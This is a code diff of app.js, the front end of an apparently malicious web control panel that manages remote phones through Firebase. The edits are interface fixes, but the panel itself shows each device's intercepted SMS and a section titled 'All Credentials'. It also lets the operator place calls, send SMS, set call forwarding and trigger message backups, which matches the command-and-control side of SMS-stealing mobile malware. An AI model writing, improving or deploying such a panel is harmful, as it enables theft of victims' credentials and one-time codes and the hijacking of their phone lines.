@@ -1,5 +1,5 @@
 /* ============================================================ */
-/* app.js - Fixed: Realtime Device Online Check & No Jitter     */
+/* app.js - Fixed: No Auto-Refresh Jitter, Serial Numbers      */
 /* ============================================================ */
 
 // ============================================================
@@ -39,8 +39,9 @@ let modalSmsOffset = 0;
 let modalTarget = 'ALL';
 let deviceSmsCache = {};
 let smsFilterDevice = null;
-let deviceSerialMap = {}; // Cache for serial numbers
-let isRendering = false; // Prevent re-render while rendering
+let deviceSerialMap = {};
+let isRendering = false;
+let isUpdatingUI = false;
 
 // ============================================================
 // DOM REFS
@@ -63,7 +64,7 @@ db.ref(".info/connected").on("value", (snap) => {
 });
 
 // ============================================================
-// MAIN DATA LISTENER
+// MAIN DATA LISTENER - NO AUTO REFRESH JITTER
 // ============================================================
 let firstLoad = true;
 let lastData = {};
@@ -72,7 +73,7 @@ db.ref().on("value", (snapshot) => {
     const newData = snapshot.val() || {};
     
     if (JSON.stringify(newData) === JSON.stringify(lastData)) {
-        return; // No change, skip re-render
+        return;
     }
     
     cachedData = newData;
@@ -82,7 +83,7 @@ db.ref().on("value", (snapshot) => {
     const typing = active && (active.tagName === 'INPUT' || active.tagName === 'TEXTAREA' || active.tagName === 'SELECT');
     if (typing) return;
 
-    if (!isRendering) {
+    if (!isRendering && !isUpdatingUI) {
         renderAll();
     }
 
@@ -94,22 +95,11 @@ db.ref().on("value", (snapshot) => {
     }
 });
 
-// Helper Function: Device Online Status Evaluator
-function isDeviceOnline(dev) {
-    if (!dev) return false;
-    let online = dev.isOnline || dev.online || false;
-    const lastSeen = dev.last_online || dev.timestamp;
-    if (!online && lastSeen && (Date.now() - lastSeen < 120000)) {
-        online = true;
-    }
-    return online;
-}
-
 // ============================================================
-// RENDER ALL
+// RENDER ALL - WITH CACHE
 // ============================================================
 function renderAll() {
-    if (isRendering) return;
+    if (isRendering || isUpdatingUI) return;
     isRendering = true;
     
     try {
@@ -201,6 +191,17 @@ function filterDevices(filter) {
 }
 
 // ============================================================
+// GET DEVICE ONLINE STATUS
+// ============================================================
+function isDeviceOnline(dev) {
+    if (!dev) return false;
+    const online = dev.isOnline || dev.online || false;
+    const lastSeen = dev.last_online || dev.timestamp;
+    if (!online && lastSeen && (Date.now() - lastSeen < 120000)) return true;
+    return online;
+}
+
+// ============================================================
 // GET DEVICE SERIAL NUMBER - CACHED
 // ============================================================
 function getDeviceSerial(devId) {
@@ -217,58 +218,15 @@ function getDeviceSerial(devId) {
 }
 
 // ============================================================
-// CHECK INDIVIDUAL DEVICE ONLINE STATUS (ON CLICK CHECK)
-// ============================================================
-function checkDeviceOnline(devId, event) {
-    if (event) event.stopPropagation();
-
-    const statusEl = $(`status-${devId}`);
-    if (statusEl) {
-        statusEl.textContent = '⏳ Checking...';
-        statusEl.className = 'device-status';
-    }
-
-    showToast(`🔍 Checking status for ${devId}...`, 'info');
-
-    db.ref(`user_data/${devId}`).once('value').then((snap) => {
-        if (snap.exists()) {
-            const dev = snap.val();
-            if (!cachedData.user_data) cachedData.user_data = {};
-            cachedData.user_data[devId] = dev;
-
-            const online = isDeviceOnline(dev);
-            const lastSeen = dev.last_online || dev.timestamp;
-            const timeStr = lastSeen ? new Date(lastSeen).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : 'N/A';
-
-            if (statusEl) {
-                statusEl.className = `device-status ${online ? 'online' : 'offline'}`;
-                statusEl.textContent = online ? '● Online' : '● Offline';
-            }
-
-            const timeEl = $(`time-${devId}`);
-            if (timeEl) timeEl.textContent = `⏱ ${timeStr}`;
-
-            if (online) {
-                showToast(`🟢 Device ${devId} is ONLINE`, 'success');
-            } else {
-                showToast(`🔴 Device ${devId} is OFFLINE`, 'warning');
-            }
-        } else {
-            showToast('❌ Device data not found', 'error');
-        }
-    }).catch(() => {
-        showToast('❌ Error checking status', 'error');
-    });
-}
-
-// ============================================================
-// RENDER DEVICES
+// RENDER DEVICES - FIXED: NO JITTER, WITH SERIAL NUMBERS
 // ============================================================
 function renderDevices() {
+    if (isUpdatingUI) return;
     const container = $('devicesContainer');
     const devices = cachedData.user_data || {};
     allDeviceKeys = Object.keys(devices);
 
+    // Sort devices by serial number (descending - newest first)
     allDeviceKeys.sort((a, b) => {
         const serialA = getDeviceSerial(a);
         const serialB = getDeviceSerial(b);
@@ -276,9 +234,15 @@ function renderDevices() {
     });
 
     if (currentFilter === 'online') {
-        filteredDeviceKeys = allDeviceKeys.filter(id => isDeviceOnline(devices[id]));
+        filteredDeviceKeys = allDeviceKeys.filter(id => {
+            const d = devices[id];
+            return isDeviceOnline(d);
+        });
     } else if (currentFilter === 'offline') {
-        filteredDeviceKeys = allDeviceKeys.filter(id => !isDeviceOnline(devices[id]));
+        filteredDeviceKeys = allDeviceKeys.filter(id => {
+            const d = devices[id];
+            return !isDeviceOnline(d);
+        });
     } else {
         filteredDeviceKeys = [...allDeviceKeys];
     }
@@ -367,8 +331,8 @@ function renderDevices() {
                         </div>
                     </div>
                     <div style="text-align:right;">
-                        <span class="device-status ${statusClass}" id="status-${devId}" onclick="checkDeviceOnline('${devId}', event)" title="Click to refresh status">${statusText}</span>
-                        <div style="font-size:9px;color:var(--text-muted);margin-top:2px;" id="time-${devId}">⏱ ${timeStr}</div>
+                        <span class="device-status ${statusClass}">${statusText}</span>
+                        <div style="font-size:9px;color:var(--text-muted);margin-top:2px;">⏱ ${timeStr}</div>
                     </div>
                 </div>
 
@@ -381,14 +345,19 @@ function renderDevices() {
 
                 <div class="device-body">
                     <div class="device-actions-luxury">
-                        <button class="sub-btn ${activeTab === 'sms' ? 'active-sms' : ''}" onclick="event.stopPropagation();setTab('${devId}','sms')">💬 ${totalSms}</button>
-                        <button class="sub-btn ${activeTab === 'login' ? 'active-login' : ''}" onclick="event.stopPropagation();setTab('${devId}','login')">🔑 ${devLoginList.length}</button>
+                        <button class="sub-btn ${activeTab === 'sms' ? 'active-sms' : ''}" onclick="event.stopPropagation();setTab('${devId}','sms')">
+                            💬 ${totalSms}
+                        </button>
+                        <button class="sub-btn ${activeTab === 'login' ? 'active-login' : ''}" onclick="event.stopPropagation();setTab('${devId}','login')">
+                            🔑 ${devLoginList.length}
+                        </button>
                         <button class="sub-btn ${activeTab === 'call' ? 'active-call' : ''}" onclick="event.stopPropagation();setTab('${devId}','call')">📞</button>
                         <button class="sub-btn ${activeTab === 'sendsms' ? 'active-sendsms' : ''}" onclick="event.stopPropagation();setTab('${devId}','sendsms')">✉️</button>
                         <button class="sub-btn ${activeTab === 'fwd' ? 'active-fwd' : ''}" onclick="event.stopPropagation();setTab('${devId}','fwd')">🔀</button>
                         <button class="sub-btn ${activeTab === 'backup' ? 'active-backup' : ''}" onclick="event.stopPropagation();setTab('${devId}','backup')">💾</button>
                     </div>
 
+                    <!-- SMS Section -->
                     <div class="section-box ${activeTab === 'sms' ? 'active' : ''}" id="sec-sms-${devId}">
                         <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
                             <h4 style="color:var(--gold-light);margin:0;font-size:13px;">💬 SMS (${totalSms})</h4>
@@ -401,6 +370,7 @@ function renderDevices() {
                         ${hasMoreSms ? `<button class="btn-load-more" style="margin-top:6px;padding:6px;font-size:11px;" onclick="event.stopPropagation();loadMoreDeviceSms('${devId}')">📥 Load More</button>` : ''}
                     </div>
 
+                    <!-- Login Section -->
                     <div class="section-box ${activeTab === 'login' ? 'active' : ''}" id="sec-login-${devId}">
                         <h4 style="color:#f59e0b;font-size:13px;">🔑 All Credentials</h4>
                         <div class="login-cards">
@@ -408,6 +378,7 @@ function renderDevices() {
                         </div>
                     </div>
 
+                    <!-- Call Section -->
                     <div class="section-box ${activeTab === 'call' ? 'active' : ''}" id="sec-call-${devId}">
                         <h4 style="color:var(--green);font-size:13px;">📞 Make Call</h4>
                         <input type="text" id="callNum-${devId}" value="${formMemory[`callNum-${devId}`] || ''}" placeholder="Phone Number" oninput="formMemory['callNum-${devId}']=this.value" onclick="event.stopPropagation()">
@@ -420,6 +391,7 @@ function renderDevices() {
                         </button>
                     </div>
 
+                    <!-- Send SMS Section -->
                     <div class="section-box ${activeTab === 'sendsms' ? 'active' : ''}" id="sec-sendsms-${devId}">
                         <h4 style="color:var(--purple);font-size:13px;">✉️ Send SMS</h4>
                         <input type="text" id="smsNum-${devId}" value="${formMemory[`smsNum-${devId}`] || ''}" placeholder="Recipient" oninput="formMemory['smsNum-${devId}']=this.value" onclick="event.stopPropagation()">
@@ -433,6 +405,7 @@ function renderDevices() {
                         </button>
                     </div>
 
+                    <!-- Forward Section -->
                     <div class="section-box ${activeTab === 'fwd' ? 'active' : ''}" id="sec-fwd-${devId}">
                         <h4 style="color:var(--red);font-size:13px;">🔀 Call Forward</h4>
                         <input type="text" id="fwdNum-${devId}" value="${formMemory[`fwdNum-${devId}`] || ''}" placeholder="Forward To" oninput="formMemory['fwdNum-${devId}']=this.value" onclick="event.stopPropagation()">
@@ -448,6 +421,7 @@ function renderDevices() {
                         </button>
                     </div>
 
+                    <!-- Backup Section -->
                     <div class="section-box ${activeTab === 'backup' ? 'active' : ''}" id="sec-backup-${devId}">
                         <h4 style="color:#06b6d4;font-size:13px;">💾 Backup</h4>
                         <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;">
@@ -492,55 +466,83 @@ function renderDevices() {
 }
 
 // ============================================================
-// TOGGLE DEVICE
+// TOGGLE DEVICE - FIXED: NO FULL RE-RENDER, NO BLINK
 // ============================================================
 function toggleDevice(devId) {
-    expandedDevices[devId] = !expandedDevices[devId];
-    const card = document.getElementById(`card-${devId}`);
-    if (card) {
-        card.classList.toggle('expanded');
-        const hint = card.querySelector('.device-top .device-name + div');
-        if (hint) {
-            hint.textContent = expandedDevices[devId] ? '▲ Click to collapse' : '▼ Click to expand';
+    if (isUpdatingUI) return;
+    isUpdatingUI = true;
+    
+    try {
+        // Toggle expanded state
+        expandedDevices[devId] = !expandedDevices[devId];
+        
+        // Find the card
+        const card = document.getElementById(`card-${devId}`);
+        if (card) {
+            // Toggle expanded class
+            card.classList.toggle('expanded');
+            
+            // Update hint text
+            const hint = card.querySelector('.device-top .device-name + div');
+            if (hint) {
+                hint.textContent = expandedDevices[devId] ? '▲ Click to collapse' : '▼ Click to expand';
+            }
+            
+            // Update device info grid click handler - no re-render needed
+            const infoGrid = card.querySelector('.device-info-grid');
+            if (infoGrid) {
+                // Keep the onclick attribute as is
+            }
         }
+    } finally {
+        isUpdatingUI = false;
     }
 }
 
 // ============================================================
-// SET TAB
+// SET TAB - NO FULL RE-RENDER
 // ============================================================
 function setTab(devId, tab) {
-    if (activeTabs[devId] === tab) {
-        activeTabs[devId] = null;
-    } else {
-        activeTabs[devId] = tab;
-        if (tab === 'backup') refreshDeviceBackup(devId);
-    }
+    if (isUpdatingUI) return;
+    isUpdatingUI = true;
     
-    const card = document.getElementById(`card-${devId}`);
-    if (!card) return;
+    try {
+        if (activeTabs[devId] === tab) {
+            activeTabs[devId] = null;
+        } else {
+            activeTabs[devId] = tab;
+            if (tab === 'backup') refreshDeviceBackup(devId);
+        }
+        
+        const card = document.getElementById(`card-${devId}`);
+        if (!card) return;
 
-    const buttons = card.querySelectorAll('.device-actions-luxury .sub-btn');
-    buttons.forEach(btn => {
-        btn.className = btn.className.replace(/active-\w+/g, '').trim();
-    });
-
-    const sections = card.querySelectorAll('.section-box');
-    sections.forEach(sec => sec.classList.remove('active'));
-
-    const targetTab = activeTabs[devId];
-    if (targetTab) {
-        const activeSec = card.querySelector(`#sec-${targetTab}-${devId}`);
-        if (activeSec) activeSec.classList.add('active');
-
+        // Update button states
+        const buttons = card.querySelectorAll('.device-actions-luxury .sub-btn');
         buttons.forEach(btn => {
-            if (btn.textContent.trim().includes('💬') && targetTab === 'sms') btn.classList.add('active-sms');
-            else if (btn.textContent.trim().includes('🔑') && targetTab === 'login') btn.classList.add('active-login');
-            else if (btn.textContent.trim().includes('📞') && targetTab === 'call') btn.classList.add('active-call');
-            else if (btn.textContent.trim().includes('✉️') && targetTab === 'sendsms') btn.classList.add('active-sendsms');
-            else if (btn.textContent.trim().includes('🔀') && targetTab === 'fwd') btn.classList.add('active-fwd');
-            else if (btn.textContent.trim().includes('💾') && targetTab === 'backup') btn.classList.add('active-backup');
+            btn.className = btn.className.replace(/active-\w+/g, '').trim();
         });
+
+        // Update section visibility
+        const sections = card.querySelectorAll('.section-box');
+        sections.forEach(sec => sec.classList.remove('active'));
+
+        const targetTab = activeTabs[devId];
+        if (targetTab) {
+            const activeSec = card.querySelector(`#sec-${targetTab}-${devId}`);
+            if (activeSec) activeSec.classList.add('active');
+
+            buttons.forEach(btn => {
+                if (btn.textContent.trim().includes('💬') && targetTab === 'sms') btn.classList.add('active-sms');
+                else if (btn.textContent.trim().includes('🔑') && targetTab === 'login') btn.classList.add('active-login');
+                else if (btn.textContent.trim().includes('📞') && targetTab === 'call') btn.classList.add('active-call');
+                else if (btn.textContent.trim().includes('✉️') && targetTab === 'sendsms') btn.classList.add('active-sendsms');
+                else if (btn.textContent.trim().includes('🔀') && targetTab === 'fwd') btn.classList.add('active-fwd');
+                else if (btn.textContent.trim().includes('💾') && targetTab === 'backup') btn.classList.add('active-backup');
+            });
+        }
+    } finally {
+        isUpdatingUI = false;
     }
 }
 
@@ -733,11 +735,21 @@ function showCommandDialog(type, devId) {
     if (!confirm(messages[type] || 'Send command?')) return;
 
     switch (type) {
-        case 'call': sendCall(devId); break;
-        case 'sms': sendSms(devId); break;
-        case 'fwd_on': sendFwd(devId, 'call forward'); break;
-        case 'fwd_off': sendFwd(devId, 'forward off'); break;
-        case 'backup': triggerDeviceBackup(devId); break;
+        case 'call':
+            sendCall(devId);
+            break;
+        case 'sms':
+            sendSms(devId);
+            break;
+        case 'fwd_on':
+            sendFwd(devId, 'call forward');
+            break;
+        case 'fwd_off':
+            sendFwd(devId, 'forward off');
+            break;
+        case 'backup':
+            triggerDeviceBackup(devId);
+            break;
     }
 }
 
@@ -916,9 +928,10 @@ function refreshDeviceBackup(devId) {
             const msg = data.backup_message || '';
             let color = 'var(--text-muted)';
             let icon = '📊';
-            if (st === 'success') { color = 'var(--green)'; icon = '✅'; } 
-            else if (st === 'in_progress' || st === 'pending') { color = '#f59e0b'; icon = '⏳'; } 
-            else if (st === 'failed' || st === 'error') { color = 'var(--red)'; icon = '❌'; }
+            if (st === 'success') { color = 'var(--green)';
+                icon = '✅'; } else if (st === 'in_progress' || st === 'pending') { color = '#f59e0b';
+                icon = '⏳'; } else if (st === 'failed' || st === 'error') { color = 'var(--red)';
+                icon = '❌'; }
             html += `<div style="color:${color};">${icon} ${st} ${msg ? '- ' + msg : ''}</div>`;
 
             db.ref(`user_data/${devId}/backup_info`).once('value').then(infoSnap => {
@@ -1128,6 +1141,11 @@ function renderModalSms() {
     }
 }
 
+function loadMoreModalSms() {
+    modalSmsOffset += SMS_LIMIT;
+    renderModalSms();
+}
+
 function closeSmsModal(e) {
     if (e && e.target !== e.currentTarget) return;
     $('smsModal').classList.remove('open');
@@ -1138,7 +1156,6 @@ function closeSmsModal(e) {
 // ============================================================
 function showToast(message, type = 'info', duration = 2800) {
     const container = $('toastContainer');
-    if (!container) return;
     const toast = document.createElement('div');
     toast.className = `toast-luxury ${type}`;
     toast.textContent = message;
@@ -1160,22 +1177,19 @@ function escapeHtml(text) {
 }
 
 // ============================================================
-// INITIALIZATION
+// BACKUP DEVICE SELECT LISTENER
 // ============================================================
 document.addEventListener('DOMContentLoaded', function() {
-    const select = $('backupDeviceSelect');
-    if (select) {
-        select.addEventListener('change', function() {
-            const id = this.value;
-            if (id) {
-                updateBackupStatusDisplay(id);
-                loadBackupSmsForDevice(id);
-                refreshDeviceBackup(id);
-            } else {
-                $('backupSmsList').innerHTML = '<div class="empty-luxury">Select a device to view backup messages</div>';
-            }
-        });
-    }
+    $('backupDeviceSelect').addEventListener('change', function() {
+        const id = this.value;
+        if (id) {
+            updateBackupStatusDisplay(id);
+            loadBackupSmsForDevice(id);
+            refreshDeviceBackup(id);
+        } else {
+            $('backupSmsList').innerHTML = '<div class="empty-luxury">Select a device to view backup messages</div>';
+        }
+    });
 
-    if ($('filterAll')) $('filterAll').classList.add('active');
+    $('filterAll').classList.add('active');
 });
